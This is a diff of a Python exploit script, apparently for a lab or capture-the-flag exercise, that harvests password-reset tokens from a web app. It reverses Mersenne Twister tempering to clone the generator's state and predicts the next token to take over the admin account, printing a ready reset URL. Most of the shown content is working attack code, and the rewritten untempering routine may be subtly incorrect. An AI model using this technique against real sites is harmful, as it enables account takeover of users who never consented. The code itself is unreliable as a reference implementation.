@@ -14,10 +14,10 @@ class MT19937:
 	F = 1812433253
 
 	def __init__(self, seed):
-		print(seed)
+		#print(seed)
 		if isinstance(seed, bytes):
 			seed = int.from_bytes(seed, 'big')
-		#seed = seed & 0xFFFFFFFF
+		seed = seed & 0xFFFFFFFF
 
 		self.lower_mask = (1 << self.R) - 1
 		self.upper_mask = self.D & -self.lower_mask
@@ -36,7 +36,7 @@ class MT19937:
 		if self.idx >= self.N:
 			if self.idx > self.N:
 				raise Exception("No seed present")
-		self.twist()
+			self.twist()
 
 		y = self.MT[self.idx]
 		y = y ^ ((y >> self.U) & self.D)
@@ -66,30 +66,45 @@ class MT19937:
 		self.index = self.N  # Ensures the generator is ready to "twist" upon the next generation request 
 
 
-def reverse_right_xor(y, shift):
-    i = 0
-    while i * shift < 32:
-        part_mask = ((1 << shift) - 1) << (shift * i)
-        part = y & part_mask
-        y ^= part >> shift
-        i += 1
-    return y
+def u_mix (y):
+	U, D = 11, 0xFFFFFFFF
+	S, B = 7, 0x9D2C5680
+	T, C = 15, 0xEFC60000
+	L = 18
+	unmix = y
+	for i in range(L-1):
+		unmix = unmix ^ (unmix >> L)
+	for i in range(T):
+		unmix = unmix ^ ((unmix << T) & C)
+	for i in range(S):
+		unmix = unmix ^ ((unmix << S) & B)
+	for i in range(U):
+		unmix = unmix ^ ((unmix >> U) & D)
+	return unmix & 0xFFFFFFFF
 
+def temper(y):
+	U, D = 11, 0xFFFFFFFF
+	S, B = 7, 0x9D2C5680
+	T, C = 15, 0xEFC60000
+	L = 18
+    
+	y = y ^ ((y >> U) & D)
+	y = y ^ ((y << S) & B)
+	y = y ^ ((y << T) & C)
+	y = y ^ (y >> L)
+	return D & y
 
-def reverse_left_xor_and(y, shift, and_mask):
-    for i in range(32 // shift):
-        part_mask = ((1 << shift) - 1) << (shift * i)
-        part = y & part_mask
-        y ^= (part << shift) & and_mask
-    return y
+# Testing umix functionality 
+def test_umix(seed=123, count=10):
+    original_outputs = generate_test_outputs(seed, count)
+    tempered_outputs = [temper(y) for y in original_outputs]
+    reversed_outputs = [u_mix(y) for y in tempered_outputs]
 
-# dont know if this is right
-def u_mix(y):
-    y = reverse_right_xor(y, 18)
-    y = reverse_left_xor_and(y, 15, 0xEFC60000)
-    y = reverse_left_xor_and(y, 7, 0x9D2C5680)
-    y = reverse_right_xor(y, 11)
-    return y
+    # Check if the reversed outputs match the original outputs
+    for original, reversed_y in zip(original_outputs, reversed_outputs):
+        assert original == reversed_y, f"Failed to reverse tempering: {original} != {reversed_y}"
+
+    print("All tests passed. u_mix is correctly reversing the tempering process.")
 
 # given a token use our u-mix function to decode the token
 def decode_and_reverse(token):
@@ -99,11 +114,10 @@ def decode_and_reverse(token):
 		decoded = base64.b64decode(token.encode('utf-8'))
 		decoded_bytes = decoded.decode('utf-8')
 		values = decoded_bytes.split(":")
-		print(values)
+
 		for b in values:
 			reversed_int = u_mix(int(b))
 			reversed_integers.append(reversed_int)
-		print(reversed_integers)
 	except Exception as e:
 		print(f"Error processing token: {e}")
 
@@ -115,7 +129,6 @@ def extract_token_from_html(response):
 	soup = BeautifulSoup(response.text, 'html.parser')
 
 	p_tags = soup.find_all('p')
-	print(p_tags)
 	for p in p_tags:
 		if "token" in p.text:
 			return get_token(p.text.strip())  
@@ -150,15 +163,11 @@ def collect_tokens(base_url, forgot_password_endpoint, username):
 
 # now that the generator is at the initial state, we predict the future tokens
 def predict_next_token(mt_instance):
-    predicted_values = [mt_instance.extract_number() for i in range(8)]
-    token = ":".join(str(value) for value in predicted_values)
-    return base64.b64encode(token.encode('utf-8'))
+	predicted_values = [mt_instance.extract_number() for i in range(8)]
+	token = ":".join(str(value) for value in predicted_values)
+	# print(token)
+	return base64.b64encode(token.encode('utf-8'))
 
-# attempt to go into admin user and change token
-def reset_admin_password(base_url, reset_endpoint, token, new_password):
-    data = {'token': token, 'password': new_password}
-    response = requests.post(f"{base_url}/{reset_endpoint}", data=data)
-    return response
 
 # realized way too late into coding this that only regular user tokens
 # show up in html, was stuck getting response 200 for so long
@@ -177,24 +186,21 @@ def generate_test_outputs(seed, count=10):
     outputs = [mt.extract_number() for _ in range(count)]
     return outputs
 
-def temper(y):
-    y ^= (y >> 11)
-    y ^= (y << 7) & 0x9D2C5680
-    y ^= (y << 15) & 0xEFC60000
-    y ^= (y >> 18)
-    return y
-
-def test_umix(seed=123, count=10):
-    original_outputs = generate_test_outputs(seed, count)
-    tempered_outputs = [temper(y) for y in original_outputs]
-    reversed_outputs = [u_mix(y) for y in tempered_outputs]
-
-    # Check if the reversed outputs match the original outputs
-    for original, reversed_y in zip(original_outputs, reversed_outputs):
-        assert original == reversed_y, f"Failed to reverse tempering: {original} != {reversed_y}"
-
-    print("All tests passed. u_mix is correctly reversing the tempering process.")
-
+# another test function
+def big_guy():
+	reversed_integers = []
+	token = 'MzAxMzYyMjIwNToxMzgwMzYzODk2OjQwOTgwMjk2OTA6NjYyODY5NjUzOjMzMDA5MTI5Mjg6MzEwNzEyMDEzNzo1MzQzMzI1ODE6ODU5MzcyNDg3'
+	decoded = base64.b64decode(token.encode('utf-8'))
+	decoded_bytes = decoded.decode('utf-8')
+	values = decoded_bytes.split(":")
+	for b in values:
+		reversed_int = u_mix(int(b))
+		reversed_integers.append(reversed_int)
+	print(reversed_integers)
+	token2 = str(reversed_integers[0])
+	for i in range(1,7):
+		token2 += ":" + str(reversed_integers[i])
+	print(base64.b64encode(token2.encode('utf-8')))
 
 
 if __name__ == "__main__":
@@ -207,7 +213,6 @@ if __name__ == "__main__":
 		
 	register_user(base_url, dummy_user, dummy_pass)
 	tokens = collect_tokens(base_url, endpoint, dummy_user)	
-	print(tokens)
 
 
 	decoded_and_reversed = []
@@ -215,17 +220,13 @@ if __name__ == "__main__":
 		integers_from_token = decode_and_reverse(token)
 		
 		decoded_and_reversed.extend(integers_from_token)
-	print(len(decoded_and_reversed))
-	# # generate new instance of MT with initial state
-	# mt_clone = MT19937(0)
-	# mt_clone.set_state(decoded_and_reversed)
+	
+	# generate new instance of MT with initial state
+	mt_clone = MT19937(0)
+	mt_clone.set_state(decoded_and_reversed)
 
-	# predicted_token = predict_next_token(mt_clone)
-	# print(predicted_token)
-	# # #reset password
-	# reset_endpoint = "reset"
-	# new_password = "imgoated"  # Choose a new password for the admin
-	# print(reset_admin_password(base_url, reset_endpoint, predicted_token, new_password))
+	predicted_token = predict_next_token(mt_clone)
+	print('http://0.0.0.0:8080/reset?token=' + str(predicted_token.decode('utf-8')))
+	# reset password
 
-	test_umix(246, 10)
 
